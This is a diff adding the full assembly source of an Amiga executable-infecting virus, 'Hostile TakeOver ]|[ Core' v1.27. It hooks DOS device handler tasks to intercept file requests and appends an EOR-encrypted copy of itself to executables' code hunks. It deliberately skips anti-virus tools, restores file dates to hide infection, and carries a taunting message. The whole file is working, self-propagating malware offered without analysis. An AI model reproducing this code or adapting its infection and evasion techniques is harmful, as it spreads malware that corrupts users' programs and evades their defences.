@@ -1,0 +1,696 @@
+*************************************************************************
+*									*
+*	Hostile TakeOver ]|[ Core					*
+*	Version 1.27 Revision 200106282240 © 1997-2001			*
+*									*
+*	Difference from 1.26: Extra Exe check, Extra AV check		*
+*									*
+*************************************************************************
+
+	incdir sc:include
+	include system/system.gs		*Devpac's system.i symbols
+	include exec/execbase.i
+	include dos/doshunks.i
+
+LoRange	 EQU 70					*Was 62; Should be 74 on <3.1
+TotRange EQU 5					*Was  7; Should be 0  on <3.1
+DevTotal EQU 32
+InfRate  EQU 4					*Infection rate -1....4
+
+*************************************************************************
+*									*
+*	Initialization routine...Not part of main prog			*
+*									*
+*************************************************************************
+
+FkEntry	movem.l d0-a6,-(a7)
+	bsr.s Entry
+	movem.l (a7)+,d0-a6
+	rts
+	cnop 0,4
+
+*************************************************************************
+*									*
+*	Main Program							*
+*									*
+*************************************************************************
+
+Entry	move.l 4.w,a6
+	movem.l d0-d7/a0-a6,-(a7)
+	cmp.w #37,LIB_VERSION(a6)		*check for OS 37
+	bcs.s Exit
+	lea Name(pc),a1
+	jsr _LVOFindTask(a6)
+	tst.l d0				*Proc already in place?
+	bne.s Exit
+	move.l #VMem,d0
+	bsr.s AllVec
+        beq.s Exit
+        move.l d0,a2
+        move.l a2,a3
+        move.w #HedLen4-1,d0
+	lea Entry(pc),a1
+	moveq.l #0,d2
+	bsr.s CpLoop
+	pea Exit(pc)
+	pea Begin-Entry(a3)
+	pea _LVOCacheClearU(a6)
+	move.w #VLen4-HedLen4-1,d0
+Crypt	move.l #$00000000,d2
+CpLoop	move.l (a1)+,d1
+goceR	eor.l d2,d1
+	move.l d1,(a2)+			*Decrypt and copy to reserved mem
+	dbf d0,CpLoop
+	rts
+
+Exit	movem.l (a7)+,d0-d7/a0-a6
+Exit2	rts
+
+AllVec	movem.l d1-a6,-(a7)
+	move.l #MEMF_PUBLIC|MEMF_REVERSE|MEMF_CLEAR,d1
+	jsr _LVOAllocVec(a6)
+	movem.l (a7)+,d1-a6
+	tst.l d0
+Error	rts
+
+Name	dc.b "SMG",0,10,0			*Easy identification....
+
+*************************************************************************
+*									*
+*	The Dispatcher							*
+*									*
+*************************************************************************
+
+	cnop 0,4
+
+Begin	bsr.s Vectors				*Get DosLib
+	bsr.s Bingo				*Get Devices (DH0 etc.)
+	bsr EORLoop				*Encrypt Body
+Here	bsr AddTask				*Install SMG
+	bra Switch				*Switch pointers
+
+*************************************************************************
+*									*
+*	Is dos.library present? (Not always in case of RDB infection	*
+*									*
+*************************************************************************
+
+Vectors	move.w $dff006,d0
+	lea DosLib(pc),a1
+	move.w d0,Cryptor-DosLib(a1)
+	moveq.l #-1,d0
+	move.l d0,Busy-DosLib(a1)
+	move.l LibList(a6),a0
+	jsr _LVOFindName(a6)
+	lea DosBase(pc),a1
+	move.l d0,(a1)
+	bne.s BaseFnd
+	addq.l #4,a7
+BaseFnd	rts	
+
+*************************************************************************
+*									*
+*	This routine looks for all devices in the DeviceList		*
+*									*
+*************************************************************************
+
+Bingo	bsr.s Objects
+	tst.l d0
+	beq.s Last1
+Ready	moveq.l #DevTotal-1,d7
+	move.l DosBase(pc),a1
+	lea Tasks(pc),a2
+	move.l dl_Root(a1),a1
+	move.l rn_Info(a1),a1
+	bsr.s BPTR
+	move.l di_DevInfo(a1),a1
+Next1	bsr.s BPTR
+	tst.l dl_Type(a1)
+	beq.s Volume
+Fin	tst.l (a1)
+	beq.s Last1
+	move.l (a1),a1
+	bra.s Next1
+Volume	tst.l dl_Task(a1)
+	beq.s Fin
+	move.l dl_Task(a1),a3
+	cmp.b #8,MP_SIGBIT(a3)			*Are they waiting for DOS?
+	bne.s Fin
+	move.l MP_SIGTASK(a3),a3
+	move.l a3,(a2)+	
+	dbf d7,Fin
+Last1	rts
+
+BPTR	move.l a1,d1
+	lsl.l #2,d1
+	move.l d1,a1
+	rts
+
+*************************************************************************
+*									*
+*	Here, some DOS-objects will be allocated, like FH, StdPKT	*
+*	and FIB. These are allocated once at start-up.			*
+*									*
+*************************************************************************
+
+Objects	moveq.l #DOS_STDPKT,d1
+	bsr.s AllDos
+	tst.l d0
+	bne.s FndPkt
+NoMem	rts
+
+FndPkt	lea DOSPkt(pc),a2
+	move.l d0,(a2)
+	moveq.l #DOS_FIB,d1
+	bsr.s AllDos
+	tst.l d0
+	beq.s NoMem
+	lea FIB(pc),a3
+	move.l d0,(a3)
+	clr.l d1
+	bsr.s AllDos
+	tst.l d0
+	beq.s NoMem
+AllDone	lea FlHndl(pc),a3
+	move.l d0,(a3)
+	rts
+
+AllDos	moveq.l #0,d2
+	move.l DosBase(pc),a6
+	jsr _LVOAllocDosObject(a6)
+	move.l 4.w,a6
+	rts
+
+*************************************************************************
+*									*
+*	This routine ensures that when a device is pulled from		*
+*	the wait state, our process is activated instead of the		*
+*	original one. This is done by replacing a value on the		*
+*	stack, which is generated after a task switch			*
+*	With a dirty hack I made it compatible with OS 3.1 and 3.5	*
+*	(On pre 3.1 the offset was always 74.)				*
+*	However, on OS 3.9 the GetMsg() call would lock up the system	*
+*	Fixed that by using the exec routine without Disable()/Enable()	*
+*	Because of this hack, gurus are possible and also enforcer hits	*
+*	I think it's worth the risk...					*
+*									*
+*************************************************************************
+
+Switch	lea WtIns(pc),a5
+	lea Tasks(pc),a4
+	lea ReturnV(pc),a2
+	moveq.l #DevTotal-1,d2
+DoLoop2	move.l (a4)+,d1
+	bne.s FndDev
+DoDBF2	addq.l #4,a2
+DoDBF	dbf d2,DoLoop2
+	rts
+
+FndDev	move.l d1,a3
+	cmp.b #TS_WAIT,TC_STATE(A3)		*Is it waiting for packets?
+	bne.s DoDBF2
+	moveq.l #TotRange,d3
+	move.l TC_SPREG(a3),a1
+	lea LoRange(a1),a1
+DoRange	cmp.l (a1),a5
+	beq.s DoDBF2				*Already in place?
+	move.l (a1),d5
+	beq.s DoNtChk
+	btst #0,d5
+	bne.s DoNtChk
+	move.l d5,a3				*Enforcer hit?
+	cmp.l #$4eaefec2,-4(a3)			*jsr _LVOWait(a6)
+	beq.s YoHo
+DoNtChk	addq.l #4,a1
+	dbf d3,DoRange
+	bra.s DoDBF2
+
+YoHo	move.l (a1),(a2)+			*Exchange returnpoints
+	move.l a5,(a1)
+	bra.s DoDBF
+
+*************************************************************************
+*									*
+*	The following routine sets up a process (With a priority of 4)	*
+*	This also means a MsgPort will be initialized			*
+*									*
+*************************************************************************
+
+AddTask	lea Name(pc),a1
+	move.l a1,d1
+	moveq.l #InfRate,d2			*Set Infection Rate (4=Best)
+	lea SegLst(pc),a1
+	move.l a1,d3
+	lsr.l #2,d3
+	move.l #1024,d4				*Stack = 1024
+	move.l DosBase(pc),a6
+	jsr _LVOCreateProc(a6)
+	move.l 4.w,a6
+	lea MyPort(pc),a2
+	move.l d0,a1
+	bne.s GotProc
+	addq.l #4,a7
+	rts
+
+GotProc	move.b #PA_IGNORE,MP_FLAGS(a1)		*Don't wanna signal
+	move.l a1,(a2)
+	lea -pr_MsgPort(a1),a1
+	move.l a1,MyProc-MyPort(a2)
+	rts
+
+*************************************************************************
+*									*
+*	Now follows the process, starting with a faked SegList		*
+*	This list must be longword aligned!!				*
+*									*
+*************************************************************************
+
+	cnop 0,4
+SegLst	dc.l 16
+	dc.l 0
+
+ReEntry	lea Busy(pc),a1				*Set Busy Flag
+	addq.l #1,(a1)
+NotBusy	bsr Switch
+	move.l 4.w,a6
+	moveq.l #1,d0
+	lsl.l #8,d0
+	jsr _LVOWait(a6)			*Wait for Device to signal
+	move.l Busy(pc),d1
+	beq.s NotBusy
+	bsr.s GtLock
+	bra.s ReEntry
+
+*************************************************************************
+*									*
+*	Construct packet, send and wait for reply			*
+*									*
+*************************************************************************
+
+DoPkt	movem.l d2-a6,-(a7)
+	move.l MyPort(pc),d7
+	move.l HisPort(pc),a0
+	move.l DOSPkt(pc),a1
+	lea dp_Arg7(a1),a2
+	move.l d0,dp_Type(a1)
+	move.l d7,dp_Port(a1)
+	movem.l d1-d6,-(a2)
+	move.l (a1),a1
+	move.l d7,14(a1)
+	jsr _LVOPutMsg(a6)
+Huh	move.l MyPort(pc),a0
+
+	lea MP_MSGLIST(a0),a0			*Exec's GetMsg without the lockup
+	move.l (a0),a1
+	move.l (a1),d0
+	beq.s Huh
+	move.l d0,(a0)
+	exg.l d0,a1
+	move.l a0,4(a1)
+
+	move.l d0,a0
+	move.l LN_NAME(a0),a0			*LN_NAME = DosPkt in Msg
+	move.l dp_Res1(a0),d0
+	move.l dp_Res2(a0),d1
+	movem.l (a7)+,d2-a6
+	tst.l d0
+NoLock	rts
+
+*************************************************************************
+*									*
+*	File infector routine (Extended ZIB type, converted to		*
+*	DosPackets)							*
+*									*
+*************************************************************************
+
+AqLock	move.l DOSPkt(pc),a1
+	move.l dp_Arg1(a1),d1
+	move.l dp_Arg2(a1),d2
+	moveq.l #ACTION_LOCATE_OBJECT,d0
+	bra.s DoPkt
+
+Unlock	move.l d7,d1
+	moveq.l #ACTION_FREE_LOCK,d0
+DoPktX	bra.s DoPkt
+
+GtLock	move.l FHDelay(pc),d3
+	beq.s NoDely2
+	move.l FHDelay(pc),d6
+	move.l MemDel(pc),d7
+	lea FHDelay(pc),a5
+	clr.l (a5)
+	clr.l Delay-FHDelay(a5)
+	bsr NoDelay
+
+NoDely2	moveq.l #ACCESS_WRITE,d3
+	bsr.s AqLock
+	bne.s Hurrah
+	cmp.l #202,d2				*Already locked?
+	bne.s NoLock
+
+Locked	moveq.l #ACCESS_READ,d3			*If so, then cache the file
+	bsr.s AqLock
+	beq.s NoLock
+	lea Delay(pc),a0
+	moveq.l #-1,d7
+	move.l d7,(a0)
+
+Hurrah	move.l d0,d7
+	move.l FIB(pc),a5
+	move.l a5,d1
+	lsr.l #2,d1
+	moveq.l #ACTION_DISK_INFO,d0
+	bsr.s DoPktX
+	beq.s Unlock
+
+	cmp.l #ID_VALIDATED,id_DiskState(a5)
+	bne.s Unlock
+
+	move.l id_NumBlocks(a5),d0
+	sub.l id_NumBlocksUsed(a5),d0
+	cmp.l #5,d0
+	ble.s Unlock
+
+	move.l d7,d1
+	move.l a5,d2
+	lsr.l #2,d2
+	moveq.l #ACTION_EXAMINE_OBJECT,d0
+	bsr DoPkt
+	beq.s Unlock
+
+	tst.l fib_DirEntryType(a5)
+	bpl.s Unlock
+	tst.w fib_Protection(a5)
+	bne Unlock
+	move.l fib_Size(a5),d2
+	move.l d2,d0
+	cmp.l #100377,d2
+	bhi Unlock
+	moveq.l #3,d6
+	and.l d6,d2
+	bne Unlock
+
+	move.l fib_FileName(a5),d2
+	and.l #$00dfdfdf,d2			*a check for VIR(USZ) this is done
+	cmp.l #$00564952,d2			*to PREVENT an infection of VirusZ
+	beq Unlock				*or VIR(USEXECUTOR) or
+	cmp.l #$00534146,d2			*SAF(e)
+	beq Unlock
+
+	bsr AllVec
+	beq Unlock
+
+	move.l d7,d2
+	move.l d0,d6
+
+	move.l FlHndl(pc),a3
+	move.l HisPort(pc),fh_Type(a3)
+	move.l #ACTION_FH_FROM_LOCK,d0
+	move.l a3,d1
+	lsr.l #2,d1
+	bsr DoPkt
+	beq RetMem2
+
+	move.l d6,d7	
+	move.l FlHndl(pc),a3
+	move.l fh_Args(a3),d6
+
+	move.l Delay(pc),d2
+	beq.s NoDelay
+	lea FHDelay(pc),a5
+	move.l d6,(a5)
+	move.l d7,MemDel-FHDelay(a5)
+	rts
+
+NoDelay	move.l d6,d1				*d6 = FH
+	move.l d7,d2				*d7 = mem
+	move.l FIB(pc),a5
+	move.l fib_Size(a5),d3
+	moveq.l #ACTION_READ,d0
+	bsr DoPkt
+	cmp.l fib_Size(a5),d0
+	beq.s RDone
+	bra.s CloseF
+DoPkt2	bra DoPkt
+
+WriteF	move.l d7,d2
+Altern	move.l d6,d1
+	moveq.l #ACTION_WRITE,d0
+	bra.s DoPkt2
+
+RDone	bsr.s Insert
+	bne.s CloseF
+	move.l d6,d1
+	clr.l d2
+	moveq.l #OFFSET_BEGINNING,d3
+	move.l #ACTION_SEEK,d0
+	bsr.s DoPkt2
+
+	move.l HOffset(pc),d3
+	bsr.s WriteF
+
+	lea Crypted(pc),a0
+	move.l a0,d2
+	move.l #VLen,d3
+	bsr.s Altern
+
+	move.l d7,d2
+	move.l fib_Size(a5),d3
+	sub.l HOffset(pc),d3
+	add.l HOffset(pc),d2
+	bsr.s Altern
+	bsr.s CloseF
+	bra.s SetDate
+
+CloseF	move.l d6,d1
+	move.l #ACTION_END,d0
+	bsr.s DoPkt2
+
+	move.w #$fab4,fib_Protection(a5)
+	move.l fib_Protection(a5),d4
+	moveq.l #ACTION_SET_PROTECT,d0		*Mark File
+	bsr.s Common2
+	bra.s RetMem
+
+SetDate	moveq.l #ACTION_SET_DATE,d0
+	lea fib_DateStamp(a5),a0
+	move.l a0,d4
+Common2	lea FName(pc),a0
+	move.l a0,d3
+	move.l DirLock(pc),d2
+	clr.l d1
+	lsr.l #2,d3
+	bra.s DoPkt2
+
+RetMem2	bsr Unlock
+RetMem	move.l d7,a1
+	jmp _LVOFreeVec(a6)			*Give Memory back
+
+Insert	move.l d7,a0
+	cmp.w #$3f3,2(a0)			*<>0 = Error
+	beq.s GoForIt
+Markus	moveq.l #-1,d0
+NoGo	rts
+
+GoForIt	move.l 8(a0),d0
+	addq.l #5,d0
+	lsl.l #2,d0
+	cmp.w #HUNK_CODE,2(a0,d0.l)		*Is the first hunk a code hunk?
+	bne.s NoGo
+	move.l 4(a0,d0.l),d1
+	cmp.l 20(a0),d1				*Valid hunkstructure?
+	bne.s Markus
+	move.l d1,d3
+	add.l #VLen4,20(a0)			*Enlarge code hunk
+	add.l #VLen4,4(a0,d0.l)
+	lea 8(a0,d0.l),a2
+	lsl.l #2,d1
+	add.l d1,d0
+	addq.l #8,d0
+	lea HOffset(pc),a1
+	move.l d0,(a1)				*Get end of hunk
+	add.l d0,a0
+	move.l goceR(pc),d0
+	cmp.l Recog(a0),d0
+	beq.s Markus				*Are we already there?
+	lsl.l #1,d3
+	move.l d3,d0
+	subq.l #1,d0
+	moveq.l #-1,d2
+SForth	addq.l #2,a2
+	cmp.l #$2c780004,-2(a2)			*Look for move.l 4.w,a6 in hunk
+	beq.s FndMove
+BkLoop	dbf d0,SForth
+	tst.l d2
+	rts
+
+FndMove	move.w d0,d3
+	lsl.w #1,d3
+	cmp.w #$7fff,d3
+	bcc.s BkLoop				*Is the move.l 4.w,a6 within range?
+	move.w Here-HOffset(a1),-2(a2)
+	move.w d3,(a2)
+	moveq.l #0,d2
+	bra.s NoGo
+
+*************************************************************************
+*									*
+*	Simple EOR loop encryptor...Nothing special..			*
+*									*
+*************************************************************************
+
+EORLoop	move.l Cryptor(pc),d3
+	move.w $dff006,d3
+	lea Entry(pc),a0
+	lea Crypted(pc),a1
+	move.l d3,Crypt+2-Entry(a0)
+	move.l d3,d6
+	moveq.l #0,d3
+	move.w #HedLen4-1,d2
+	bsr.s CrpLoop
+	move.l d6,d3
+	move.w #VLen4-HedLen4-1,d2
+CrpLoop	move.l (a0)+,d5
+	eor.l d3,d5
+	move.l d5,(a1)+
+	dbf d2,CrpLoop
+	rts
+
+*************************************************************************
+*									*
+*	This routine is inserted after the device's jsr _LVOWait(a6)	*
+*	instruction (Can also be in ROM)				*
+*									*
+*************************************************************************
+
+WtIns	pea WtIns(pc)
+	movem.l d0-a6,-(a7)
+	lea Status(pc),a0
+	move.l d0,(a0)
+	move.l 4.w,a6
+	jsr _LVOForbid(a6)
+	move.l ThisTask(a6),d3			*What task did we intercept
+	lea Tasks(pc),a0
+	lea ReturnV(pc),a1
+	moveq.l #DevTotal,d4
+InsLoop	cmp.l (a0)+,d3
+	beq.s FndTask
+	addq.l #4,a1
+	dbf d4,InsLoop
+	ILLEGAL					*Never reached (I hope)
+FndTask	move.l (a1),60(a7)
+	move.l Busy(pc),d4
+	bne.s NoMsg
+	move.l Status(pc),d4
+	btst #8,d4
+	beq.s NoMsg
+	move.l d3,a0
+	lea HisPort(pc),a1
+	lea pr_MsgPort(a0),a0
+	move.l MP_MSGLIST(a0),d0		*Take a peek at his msg
+	beq.s NoMsg
+	move.l a0,(a1)
+	move.l d0,a0
+	move.l LN_NAME(a0),a0
+	move.l dp_Type(a0),d1
+	subq.l #ACTION_LOCATE_OBJECT,d1		*And look for locks
+	beq.s ItzLock
+	sub.l #ACTION_EXAMINE_NEXT-ACTION_LOCATE_OBJECT,d1
+	beq.s ItzExNx
+	bra.s NoMsg
+
+ItzLock	bsr.s Common
+	bsr.s CPkt2
+NoMsg	move.l MyProc(pc),a1
+	moveq.l #1,d0
+	lsl.l #8,d0
+	jsr _LVOSignal(a6)			*Signal SMG
+	bsr Switch				*Re-enforce hooks
+	jsr _LVOPermit(a6)
+	movem.l (a7)+,d0-a6
+	rts
+
+Common	lea Busy(pc),a1
+	subq.l #1,(a1)
+	bra.s CopyPkt
+
+ItzExNx	bsr.s Common
+	addq.l #fib_FileName,a2
+	bsr.s CPkt2
+	bra.s NoMsg
+
+CopyPkt	move.l DOSPkt(pc),a1			*Carbon-copy msg
+	move.l MyPort(pc),d1
+	move.l d1,dp_Port(a1)
+	move.l (a1),a2
+	move.l d1,14(a2)
+	move.l dp_Type(a0),dp_Type(a1)
+	move.l dp_Arg2(a0),d2			*I wonder if DirLock (Arg1)
+	lsl.l #2,d2				*is preserved...(possible GURU)
+	move.l d2,a2
+	lea FName(pc),a3
+	move.l dp_Arg1(a0),DirLock-FName(a3)
+	move.l a3,d4
+	lsr.l #2,d4
+	clr.l d3
+	rts
+
+CPkt2	move.b (a2),d3
+	addq.l #2,d3
+NamFll	move.b (a2)+,(a3)+
+	dbf d3,NamFll
+	move.l dp_Arg1(a0),dp_Arg1(a1)
+	move.l d4,dp_Arg2(a1)
+	move.l dp_Arg3(a0),dp_Arg3(a1)
+	rts
+
+*************************************************************************
+*									*
+*	The data section - In file					*
+*									*
+*************************************************************************
+
+DosLib	dc.b "dos.library",0					*12
+VText	dc.b "Smeg! it's a Hostile TakeOver! (Again!)",10	*40
+	dc.b "And just when you thought it was safe..",10	*40
+	dc.b "Flake and Georg have left the building!",10	*40
+	dc.b "-= On Tour 1995-2001 =-",10			*24
+
+*************************************************************************
+*									*
+*	The data section - Out of file					*
+*	(Must also be longword aligned)					*
+*									*
+*************************************************************************
+
+	cnop 0,4
+DosBase	dc.l 0
+DirLock	dc.l 0
+Delay	dc.l 0
+FHDelay	dc.l 0
+MemDel	dc.l 0
+MyProc	dc.l 0
+MyPort	dc.l 0
+HisPort	dc.l 0
+Busy	dc.l 0
+Status	dc.l 0
+Tasks	ds.l DevTotal
+ReturnV	ds.l DevTotal
+FIB	dc.l 0
+FlHndl	dc.l 0
+DOSPkt	dc.l 0
+HOffset	dc.l 0
+FName	ds.l 64
+
+VLen	EQU DosBase-Entry
+
+Cryptor dc.l 0
+Crypted	ds.b VLen
+End
+
+VLen4	EQU VLen/4
+VMem	EQU End-Entry
+VTLen	EQU ((DosBase-VText)/4)-1
+HedLen4	EQU ((Begin-Entry)/4)
+Recog	EQU goceR-DosBase
+
